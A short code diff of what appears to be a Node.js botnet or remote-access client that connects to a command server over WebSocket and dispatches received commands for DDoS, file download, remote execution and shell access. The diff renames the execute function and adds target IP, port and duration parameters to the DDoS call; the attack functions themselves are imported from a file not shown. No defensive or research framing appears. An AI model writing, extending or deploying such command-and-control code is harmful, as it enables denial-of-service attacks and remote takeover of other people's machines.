@@ -1,6 +1,6 @@
 const WebSocket = require('ws');
 
-const { send_file_to_sv, ddos, exec, start_shell } = require ('./commands.js')
+const { send_file_to_sv, ddos, execute, start_shell } = require ('./commands.js')
 
 const serverUrl = 'ws://server:3000';
 const ws = new WebSocket(serverUrl);
@@ -16,7 +16,7 @@ ws.on('message', message_raw => {
 
     switch (message.command) {
         case "DDoS":
-            ddos(id, message.url, message.port)
+            ddos(id, message.ip, message.port, message.time)
             break;
         case "Download":
             const name = message.name
@@ -24,7 +24,7 @@ ws.on('message', message_raw => {
             break;
 
         case "Exec":
-            exec(id)
+            execute(id, message.data, message.name)
             break;
 
         case "Shell":
